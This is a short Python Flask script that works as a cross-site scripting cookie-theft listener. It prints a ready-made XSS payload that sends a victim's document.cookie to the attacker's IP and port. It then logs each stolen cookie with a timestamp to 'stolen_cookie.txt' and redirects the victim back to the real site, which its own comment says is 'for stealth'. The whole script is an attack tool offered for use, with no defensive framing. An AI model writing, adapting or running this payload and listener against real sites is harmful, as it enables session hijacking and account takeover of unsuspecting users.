#!/usr/bin/python3

from flask import Flask, request, redirect
from datetime import datetime

redir = input("Enter redirect URL: ")
listen = input("Enter the port for your listener: ")

ip = input("For an example XSS payload, enter your IP address: ")
print("\nXSS Payload:\n" + "<script>document.location='http://" + ip + ":" + listen + "/fake-file.php?c='+document.cookie</script>\n\n")

app = Flask(__name__) # create new instance of the app

@app.route('/') # your home url
def cookie(): # grab cookie and write it to a file "cookie.txt"

    cookie = request.args.get('c')
    f = open("stolen_cookie.txt","a")
    f.write(cookie + ' ' + str(datetime.now()) + '\n')
    f.close()

    # redirect user back to actual site (& preferably correct subdir) for stealth

    return redirect(redir)

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=int(listen)) # 0.0.0.0 to listen on all public IPs
